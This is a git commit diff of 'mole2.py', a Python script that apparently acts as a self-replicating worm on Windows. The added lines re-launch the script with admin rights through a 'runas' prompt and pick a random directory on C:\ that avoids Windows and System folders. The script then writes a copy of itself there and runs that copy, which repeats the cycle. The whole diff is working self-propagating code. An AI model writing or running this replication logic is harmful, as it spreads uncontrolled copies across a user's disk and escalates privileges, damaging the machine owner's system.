bfddefc1a47e98b6bc477b4bbdc6c76ae1ee47c8
DAF201 <56328675+DAF201@users.noreply.github.com>
2021-10-07 01:16:33 -0500

    Update mole2.py

--- mole2.py
+++ mole2.py
@@ -1,8 +1,37 @@
 times = 0
 PATH = ''
-import sys,subprocess,ctypes,os
+import sys
+import subprocess
+import ctypes
+import os
+import random
+
+
+if ctypes.windll.shell32.IsUserAnAdmin():
+    pass
+else:
+    ctypes.windll.shell32.ShellExecuteW(
+        None, "runas", sys.executable, __file__, None, 1)
+    sys.exit()
+
+
 times = times+1
 this = __file__
+
+
+def random_path():
+    dictionary = []
+    for x, y in enumerate(os.walk(os.path.expanduser('C:\\'))):
+        dictionary.append(y)
+    return random.choice(dictionary)[0]
+
+
+next_path = random_path()+"\\mole"+str(times)+".py"
+while(('Windows'in next_path)or('System'in next_path)):
+    next_path = random_path()+"\\mole"+str(times)+".py"
+print(next_path)
+
+
 def self_copy():
     with open(__file__, 'r')as this_file:
         this = this_file.readlines()[2:]
@@ -10,24 +39,19 @@ def self_copy():
     for x in this:
         temp = temp+x
     this = temp
-    with open("mole"+str(times)+".py", 'w')as file:
+    with open(next_path, 'w')as file:
         file.write('times=%s\nPATH=r"%s"\n%s' % (times, __file__, this))
-def mole(mole):
-    if ctypes.windll.shell32.IsUserAnAdmin():
-        pass
-    else:
-        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
-        sys.exit()
-    print('this is the %s mole!' % (times-1))
-    mole()
-@mole
+
+
 def change():
     try:
         self_copy()
     except:
         change()
+    else:
+        print('this is the %s mole!, at %s' %((times-1), os.path.abspath(__file__)))
     try:
-        subprocess.Popen("python mole"+str(times)+".py")
+        subprocess.Popen('python '+next_path)
     except:
         change()
     else:
